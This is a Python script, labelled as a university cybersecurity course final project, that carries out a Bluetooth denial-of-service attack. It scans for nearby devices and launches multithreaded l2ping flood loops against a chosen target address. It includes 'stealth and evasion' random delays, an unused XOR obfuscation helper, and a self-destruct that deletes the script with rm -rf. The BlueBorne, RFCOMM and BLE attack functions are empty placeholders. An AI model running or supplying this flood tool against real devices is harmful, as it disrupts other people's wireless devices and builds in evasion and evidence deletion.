import os
import threading
import time
import random
import sys
import platform
from scapy.all import BluetoothL2CAPSocket, conf

# Check if running on Termux (Android) or Linux
def is_termux():
    return "com.termux" in os.getcwd()

# Obfuscation
def obfuscate(data):
    return ''.join([chr(ord(c) ^ 0xAA) for c in data])

# Stealth and Evasion
def random_packet_size():
    return random.randint(100, 1000)  # Randomize packet size

def random_delay():
    time.sleep(random.uniform(0.1, 1.0))  # Randomize delay between packets

# Advanced Targeting
def scan_bluetooth_devices():
    print("[*] Scanning for nearby Bluetooth devices...")
    if is_termux():
        os.system('termux-bluetooth-scan')  # Termux-specific Bluetooth scan
    else:
        os.system('hcitool scan')  # Linux Bluetooth scan

# Exploitation
def exploit_blueborne(target_addr):
    # Placeholder for BlueBorne exploit (hypothetical)
    print(f"[*] Attempting BlueBorne exploit on {target_addr}")
    # Add exploit code here

# Multi-Protocol Attack
def multi_protocol_attack(target_addr):
    print(f"[*] Launching multi-protocol attack on {target_addr}")
    # L2CAP Ping
    os.system(f'l2ping -i hci0 -s {random_packet_size()} -f {target_addr}')
    # RFCOMM Attack (placeholder)
    print(f"[*] RFCOMM attack on {target_addr}")
    # BLE Attack (placeholder)
    print(f"[*] BLE attack on {target_addr}")

# Self-Destruct Mechanism
def self_destruct():
    print("[*] Self-destruct initiated...")
    if is_termux():
        os.system('rm -rf /data/data/com.termux/files/home/script.py')  # Termux path
    else:
        os.system('rm -rf /path/to/script.py')  # Linux path
    sys.exit(0)

# Main DOS Function
def DOS(target_addr, packages_size):
    try:
        while True:
            packet_size = random_packet_size()
            if is_termux():
                os.system(f'termux-bluetooth-connect {target_addr}')  # Termux-specific command
            else:
                os.system(f'l2ping -i hci0 -s {packet_size} -f {target_addr}')
            random_delay()
    except Exception as e:
        print(f"[!] ERROR in DOS function: {e}")

# Main Function
def main():
    printLogo()
    if input("READY TO PROCEED? (y/n) > ").lower() == 'y':
        os.system('clear')
        printLogo()

        # Scan for targets
        if input("Scan for nearby devices? (y/n) > ").lower() == 'y':
            scan_bluetooth_devices()

        target_addr = input('Target address > ').strip()
        if not target_addr:
            print('[!] ERROR: Target address is missing')
            sys.exit(1)

        try:
            threads_count = int(input('Threads count > '))
            if threads_count <= 0:
                raise ValueError("Threads count must be greater than 0")
        except ValueError as e:
            print(f'[!] ERROR: {e}')
            sys.exit(1)

        print("\x1b[31m[*] Jamming target device BT signal in 3 seconds...\x1b[0m")
        for i in range(3, 0, -1):
            print(f'[*] {i}')
            time.sleep(1)

        # Start threads
        threads = []
        for i in range(threads_count):
            print(f'[*] Built thread №{i + 1}')
            thread = threading.Thread(target=DOS, args=(target_addr, random_packet_size()))
            thread.daemon = True
            threads.append(thread)
            thread.start()

        # Exploit target
        if input("Attempt BlueBorne exploit? (y/n) > ").lower() == 'y':
            exploit_blueborne(target_addr)

        # Multi-Protocol Attack
        if input("Launch multi-protocol attack? (y/n) > ").lower() == 'y':
            multi_protocol_attack(target_addr)

        # Self-Destruct
        if input("Enable self-destruct? (y/n) > ").lower() == 'y':
            self_destruct()

        # Keep main thread alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print('\n[*] Aborted')
            sys.exit(0)
    else:
        sys.exit(0)

# Logo
def printLogo():
    print("""
    ██████╗ ██╗     ██╗   ██╗████████╗██╗  ██╗ █████╗ ████████╗
    ██╔══██╗██║     ██║   ██║╚══██╔══╝██║  ██║██╔══██╗╚══██╔══╝
    ██████╔╝██║     ██║   ██║   ██║   ███████║███████║   ██║   
    ██╔══██╗██║     ██║   ██║   ██║   ██╔══██║██╔══██║   ██║   
    ██████╔╝███████╗╚██████╔╝   ██║   ██║  ██║██║  ██║   ██║   
    ╚═════╝ ╚══════╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
    GMU CYSE 425 FINAL PROJECT ATTACK SCRIPT - BLUETOOTH JAMMING DOS
    """)

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        print('\n[*] Aborted')
        sys.exit(0)
    except Exception as e:
        print(f'[!] ERROR: {e}')
        sys.exit(1)